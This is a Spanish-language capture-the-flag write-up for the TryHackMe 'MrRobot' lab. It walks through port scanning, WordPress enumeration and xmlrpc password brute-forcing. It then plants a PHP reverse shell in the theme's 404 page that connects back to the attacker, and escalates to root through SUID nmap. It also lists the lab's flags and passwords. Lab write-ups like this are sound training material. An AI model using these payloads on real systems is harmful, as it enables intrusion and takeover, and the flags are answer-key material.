# MrRobot

`Try Hack Me` `Linux` `CMS Wordpress` `SUID` `Nmap` `xmlrpc`

## Flags

* **Flag 1:** `073403c8a58a1f80d943455fb30724b9`
* **Flag 2:** `822c73956184f694993bede3eb39f959`
* **Flag 3:** `04787ddef27c3dee1ee161b21670b4e4`

## Users

* Elliot _\(pwd: `ER28-0652`\)_
* robot _\(pwd: `abcdefghijklmnopqrstuvwxyz`\)_

## **Enumeración**

Vemos si el host esta levantado y identificamos el SSOO con `ping -c1 IP`

> Linux: TTL &lt;= 64
>
> Windows: TTL &gt;= 65 & &lt;= 128

![](https://i.imgur.com/zU3qZea.png)

### Escaneo de puertos

Primero vemos si va muy lento el escaneo: `nmap -p- --open -T5 -v -n IP`

```text
-p-         Todos los puertos 
--open      Mostrar solos puertos abiertos 
-T5         Modo más agresivo 
-v          Modo verbose (reporta por pantalla) 
-n          No aplicar resolución DNS
```

Como va lento, lanzamos este otro comando: `nmap -sS --min-rate 5000 -p- -vvv -n -Pn IP`

```text
-sS           Realizar un TCP SYN port scan
--min-rate    Emitir al menos 5000 paquetes por segundo
-Pn           No realizar Host Discovery
```

Va más rápido y encuentra los puertos 22 \(SSH\), 80 \(HTTP\) y 443 \(HTTPS\), aunque nos dice que están cerrados.

![](https://i.imgur.com/ZpanGoL.png)

Obtenemos los servicios que corren en los puertos `nmap -sC -sV -p22,80,443 IP`

![](https://i.imgur.com/yJmkbWJ.png)

### Servicio HTTP

Lanzamos un whatweb para ver si tiene algún CMS tipo Wordpress: `whatweb IP`

![](https://i.imgur.com/vvi3qFK.png)

Vemos que es un Apache normal. Accedemos al portal web y vemos que el portal tiene una especie de terminal con comandos.

![](https://i.imgur.com/Zbpdi1J.png)

Intentamos hacer fuzzing pero va muy lento, no se puede.

Jugamos con la web y los videos locos y tras unos errores nos muestra la página de error de Wordpress.

![](https://i.imgur.com/v9eQ7VG.png)

Desde ahí, podemos acceder a **`wp-login.php`**, el login básico de Wordpress.

![](https://i.imgur.com/dWZdlIf.png)

## **Wordpress**

Seguimos esta guía para conseguir acceso a un Wordpress.

{% embed url="https://www.toxicsolutions.net/2020/07/wordpress-ctf-walkthrough/" caption="" %}

Primero enumeramos el Wordpress en busca de vulnerabilidades con **`wpscan --url IP`**. Vemos que encuentra el robots.txt:

![](https://i.imgur.com/p4TPeY4.png)

Al entrar, vemos algo raro:

![](https://i.imgur.com/RgyKV7I.png)

Si probamos a entrar en el fichero "**key-1-of-3.txt**", vemos la 1a flag

![](https://i.imgur.com/ZMvdtMt.png)

{% hint style="success" %}
FIRST FLAG: **`073403c8a58a1f80d943455fb30724b9`**
{% endhint %}

En el **`robots.txt`** vemos otro fichero **`fsocity.dic`**. Lo descargamos, parece un diccionario:

![](https://i.imgur.com/OTCkXO3.png)

Vemos algunas palabras que pueden ser utiles, como **`Elliot`**.

Probamos en el login y vemos que el usuario existe:

![](https://i.imgur.com/eJdLqH4.png)

{% hint style="warning" %}
Tenemos un usuario **`Elliot`**
{% endhint %}

Con **`wpscan`** encontramos más cosas. Vemos que la versión es **4.3.1**, considerada insegura. Podemos buscar exploits más adelante. Vemos que usa el tema **twentyfifteen**. No hay plugins instalados.

![](https://i.imgur.com/VqhyeGk.png)

![](https://i.imgur.com/GBsjeIY.png)

### Fuerza bruta xmlrpc

A parte de la enumeración de usuarios, no vemos nada reseñable para poder acceder

![](https://i.imgur.com/51Xb9vr.png)

Con wpscan vemos que está habilitado el **xml-rpc**.

![](https://i.imgur.com/n070Hxy.png)

Lo podemos explotar para hacer fuerza bruta, siguiendo esta guía

{% embed url="https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/" caption="" %}

Intentamos hacer fuerza bruta sobre con el diccionario descargado y el usuario Elliot.

> El diccionario tiene 800.000 lineas, pero si lo ordenamos y quitamos repetidas, se queda en 11.000.

Intentamos la fuerza bruta sobre el xmlrpc con Burp pero va muy muy lento.

Vemos que wpscan tiene una opción para hacer fuerza bruta sobre el xmlrpc con la opción Multicall:

```text
wpscan --url IP -U Elliot -P DICT
```

![](https://i.imgur.com/q3cMdRq.png)

{% hint style="warning" %}
Tenemos la password de **Elliot**: **`ER28-0652`**
{% endhint %}

## **Getting a shell**

Conseguimos acceso al Wordpress:

![](https://i.imgur.com/WLOAqEW.png)

Al tratarse de un Wordpress, como ya tenemos acceso, vamos a intentar editar algún PHP del tema para meter una shell reversa. Probamos con el **`404.php`**, que es el típico.

![](https://i.imgur.com/7RvuxiL.png)

Hemos puesto un **`echo`** y al acceder a una página que no existe, vemos la página 404 que muestra ese echo:

![](https://i.imgur.com/T14AFLJ.png)

Vamos a intentar acceder con shell reversa. Usamos este [Cheat-Sheet](https://ironhackers.es/herramientas/reverse-shell-cheat-sheet/).

Levantamos un puerto en escucha en nuestro Kali con `nc -lvp 8433`

En el fichero **404**, introducimos lo siguiente:

```text
<?php
    $ip="IP";
    $port=PORT;
    echo "Getting reverse shell on $ip:$port";
    $sock = fsockopen($ip,$port);
    $proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

![](https://i.imgur.com/HHdMtZW.png)

Al acceder a la página 404, conseguimos una Shell en el servidor como el usuario daemon.

![](https://i.imgur.com/cHi9tAN.png)

{% hint style="danger" %}
Podemos configurar una shell interactiva con

```bash
script /dev/null -c bash 
# CTRL + Z
stty raw -echo
fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows *NumRows* columns *NumCols*

# En una terminal de nuestra máquina, para sacar NumRows y NumCols
stty -a
```
{% endhint %}

### **User Flag**

Intentamos encontrar la 2a flag con el siguiente comando:

```text
find / -type f -name key-2-of-3.txt 2> /dev/null
```

![](https://i.imgur.com/MrCMa2A.png)

Vemos que esta en el directorio home del usuario **`robot`**.

{% hint style="success" %}
Tenemos un usuario: **`robot`**
{% endhint %}

No podemos ver el contenido del fichero. Hay que iniciar sesión con el usuario robot.

En el directorio vemos un fichero con el hash de una password.

![](https://i.imgur.com/eX3cun5.png)

Probamos en [Crackstation](https://crackstation.net/) y nos da la password, un md5 bastante easy.

![](https://i.imgur.com/ptEdp5e.png)

{% hint style="warning" %}
Tenemos la password de **robot**: **`abcdefghijklmnopqrstuvwxyz`**
{% endhint %}

Con `su robot` e introduciendo la password anterior, iniciamos sesión como robot y podemos ver la flag.

![](https://i.imgur.com/ysyKBi3.png)

{% hint style="success" %}
SECOND FLAG: **`822c73956184f694993bede3eb39f959`**
{% endhint %}

## **Privilege Escalation**

Vamos a intentar una escalada de privilegios en Linux siguiendo este [tutorial](https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4):

{% embed url="https://jieliau.medium.com/privilege-escalation-on-linux-platform-8b3fbd0b1dd4" caption="" %}

También podemos lanzar este [script ](https://github.com/rebootuser/LinEnum)para enumerar el sistema:

{% file src="../../.gitbook/assets/linenum.sh" caption="Linux Enumeration Script" %}

### Sudo and SUID files

En primer lugar, intentamos ver los privilegios de sudo del usuario robot. No puede ejecutar el comando `sudo -l`.

Buscamos los ficheros con el SUID activo.

`find / -user root -perm -4000 2>/dev/null`

![](https://i.imgur.com/ZjpFVod.png)

Podemos buscar alguno que nos llame la atención de esta guía

{% embed url="https://gtfobins.github.io/" caption="" %}

Nos llama la intención **`/usr/local/bin/nmap`**. Podemos intentar usar el comando **`nmap`** para escalar privilegios:

![](https://i.imgur.com/fsUXBOE.png)

Introducimos los siguientes comandos:

```text
nmap --interactive

#Command on nmap console
!sh
```

![](https://i.imgur.com/BZdjz5S.png)

### **Root Flag**

Hemos escalado privilegios. Vamos al directorio **`/root`** a por la 3a flag.

{% hint style="success" %}
THIRD FLAG: **`04787ddef27c3dee1ee161b21670b4e4`**
{% endhint %}

